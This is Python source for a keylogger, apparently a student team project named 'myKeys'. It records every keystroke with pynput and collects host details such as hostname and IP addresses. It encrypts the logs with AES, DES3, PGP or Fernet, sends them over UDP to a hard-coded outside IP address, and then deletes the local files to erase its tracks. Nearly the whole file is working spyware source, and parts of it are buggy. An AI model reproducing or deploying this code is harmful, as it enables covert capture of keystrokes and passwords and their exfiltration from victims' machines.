print("                  _  __")
print("                 | |/ /")
print("  _ __ ___  _   _| ' / ___ _   _ ___")
print(" | '_ ` _ \| | | |  < / _ \ | | / __|")
print(" | | | | | | |_| | . \  __/ |_| \__ \\")
print(" |_| |_| |_|\__, |_|\_\___|\__, |___/")
print("             __/ |          __/ |")
print("            |___/          |___/")


# Team myKeys
# keylogger.py
# Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins

# Libraries Used
import base64
import socket
import platform

from Cryptodome import Random
from Cryptodome.Cipher import AES, DES3
from Cryptodome.Random import get_random_bytes
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
import multiprocessing

import gnupg
from random import SystemRandom

from cryptography.fernet import Fernet

# naming files that will be generated
loggedKeys = "loggedKeys.txt"
systemInfo = "systemInfo.txt"

# naming encrypted files that will be generated
loggedKeysEncrypted = "loggedKeysEncrypted.txt"
systemInfoEncrypted = "systemInfoEncrypted.txt"

## Networking Variables
udpPort = 25005
buffer_size = 1024
server_ip = "35.231.244.179"  # static ip address

# path to the gnupg location
Path_to_foldergpg = 'C:\\Users\\User\\Documents\\Winter2021\\cis350\\myKeys\\' # cutomize this field

# payload destination variables
path = "C:\Windows\Temp" #customize this field
extend = "\\"
extendedPath = path + extend

# config variables
name = ""
key = ""
syslog = False
keylog = False
email = ""

# varubales for AES:
BS = 16
PAD = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode('utf-8')
UNPAD = lambda s: s[:-ord(s[len(s) - 1:])]
BLOCK_SIZE = 128


def setupConfig():
    global name
    global key
    global syslog
    global keylog
    global email
    f = open("./config.txt")
    config = f.readlines()
    name = config[0]
    if config[1] == '1':
        syslog = True
    if config[2] == '1':
        keylog = True
    key = config[3]
    email = config[4]


# Sends files to the cloud server
def sendFile(filename, isSysInfo):
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    f = open(filename, 'rb')
    if (not isSysInfo):
        sent_data = "incoming_keylog"
    else:
        sent_data = "incoming_sysinfo"
    clientsocket.sendto(sent_data.encode(), (server_ip, udpPort))
    l = f.read(buffer_size)
    while (l):
        clientsocket.sendto(l, (server_ip, udpPort))
        l = f.read(buffer_size)
    f.close()
    clientsocket.close()


### This creates a document that contains useful system information and specifications
def getSystemInfo():
    
    with open(extendedPath + systemInfo, "a") as f:
        # Writes hostname
        hostname = socket.gethostname()
        try:
            f.write("Hostname: " + hostname + '\n')

        except Exception:
            f.write("ERROR: could not retrieve Hostname" + '\n')

            # Writes Public IP address
        privateIP = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP address: " + publicIP + '\n')

        except Exception:
            f.write("ERROR: could not retrieve public IP address" + '\n')

        # Writes Private IP
        try:
            f.write("private IP address: " + privateIP + '\n')

        except Exception:
            f.write("ERROR: could not retrieve private IP address" + '\n')

        # Writes Machine Name
        try:
            f.write("Machine: " + platform.machine() + '\n')

        except Exception:
            f.write("ERROR: could not retrieve machine name" + '\n')

        # Writes System Type
        try:
            f.write("System: " + platform.system() + '\n')

        except Exception:
            f.write("ERROR: could not retrieve system type" + '\n')

        # Writes System Version
        try:
            f.write("Version: " + platform.version() + '\n')

        except Exception:
            f.write("ERROR: could not retrieve platform version" + '\n')

        # Writes Processor
        try:
            f.write("Processor: " + platform.processor() + '\n')

        except Exception:
            f.write("ERROR: could not retrieve processor info" + '\n')


# gets info from config file
setupConfig()
if (syslog):
    getSystemInfo()

### Run Length Variables ###
numberOfLogs = 1
logTime = 86400  # This should be 24 hours equivalent (I think)
currentTime = time.time()
endTime = currentTime + logTime  # Will result in 24 hours after currentTime

# Establishes how long the program will record keys 
# All Key Recording Processes are below 
while currentTime < endTime:
    count = 0
    keys = []

# when a key is pressed
    def onPress(key):
        global keys
        global count
        global currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeToFile(keys)
            keys = []

# writes keys to file
    def writeToFile(keys):
        # needs error handling
        with open(extendedPath + loggedKeys, "a") as f:
            for key in keys:
                k = str(key.replace("'", ""))
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


# on key release
    def onRelease(key):
        # This may not be needed
        if key == Key.esc:
            return False
        if currentTime > endTime:
            return False


    with Listener(onPress=onPress, onRelease=onRelease) as listener:
        listener.join()

    if currentTime >= endTime:
        # needs error handling
        with open(extendedPath + loggedKeys, "w") as f:
            f.write()

        numberOfLogs += 1

        currentTime = time.time()
        endTime = time.time() + logTime

        # encrypt and send
        encryptions(key, name, email, syslog, keylog)


# Files are encrypted below

# PGP encryption
# encrypt files
def encryptions(key, name, email, system, keylogger):
    systemfiles_to_encrypt = [extendedPath + systemInfo]
    keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
    systemencrypted_file_names = [extendedPath + systemInfoEncrypted]
    keylogger_encrypt_filename = [extendedPath + loggedKeysEncrypted]
    count = 0
    if system:
        for encryptingFile in systemfiles_to_encrypt:
            if name == "DES3":
                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
            if name == "AES":
                systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
            if name == "PGP":
                systemencrypted_file_names[count] = encrypt_gnupg(email, key, encryptingFile,
                                                                  keylogger_encrypt_filename[count])
            sendFile(systemencrypted_file_names[count], True)
            count += 1
    count = 0
    if keylogger:
        for encryptingFile in keyloggerfiles_to_encrypt:
            if name == "DES3":
                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
            if name == "AES":
                systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
            if name == "PGP":
                systemencrypted_file_names[count] = encrypt_gnupg(email, key, encryptingFile,
                                                                  keylogger_encrypt_filename[count])
            sendFile(keylogger_encrypt_filename[count], False)
        count += 1
    ### Deletes Files After they are Encrypted and Sent ###
    remove_files()



# des3 encryption

# encrypt files
def des3_encrypt(key, filelist_encrypt):
    iv = b'\xc3\xd0\xb9\x82\xe7\x902\xe4'
    with open(filelist_encrypt, 'rb') as f:
        data = f.read()
    cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
    pad_len = 8 - len(data) % 8
    # length of padding
    padding = chr(pad_len) * pad_len
    # PKCS5 padding content
    data += padding.encode('utf-8')
    encrypted_text = cipher_encrypt.encrypt(data)
    with open("temp.txt", 'wb') as f:
        f.write(encrypted_text)
    return "temp.txt"


def encrypt_aes(key, original_file):
    # encrypt the file with the key and aes and return the encrypt text
    count = 0
    with open(original_file, 'rb') as f:
        data = f.read()
    new_text = PAD(data)
    iv = Random.new().read(BS)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open("tmp.txt", 'wb') as f:
        f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
    return "tmp.txt"


def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
    # encrypt file name original_file
    # output in the dir and the encrypt file that we entered
    gpg = gnupg.GPG(gnupghome=Path_to_foldergpg + 'GVSU-CIS350-myKeys\\src\\bin',
                    gpgbinary=Path_to_foldergpg + 'GVSU-CIS350-myKeys\\src\\bin\\gpg.exe')
    with open(file_to_encrypt, 'rb') as f:
        status = gpg.encrypt_file(
            f, recipients=[email],
            output=encrypted_file + '.gpg')
    return encrypted_file


# Fernet encryption
def fernet_encrypt():
    files_to_encrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
    encrypted_file_names = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]

    count = 0

    for encrypting_file in files_to_encrypt:

        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[count], 'wb') as f:
            f.write(encrypted)

        count += 1
    sendFile(extendedPath + extend + systemInfoEncrypted, True)
    time.sleep(20)
    sendFile(extendedPath + extend + loggedKeysEncrypted, False)
    time.sleep(30)

# erases tracks by removing files (files will not be sent to the recycle bin)
def remove_files():
    delete_files = [systemInfo, loggedKeys, systemInfoEncrypted, loggedKeysEncrypted]
    for file in delete_files:
        os.remove(extendedPath + file)


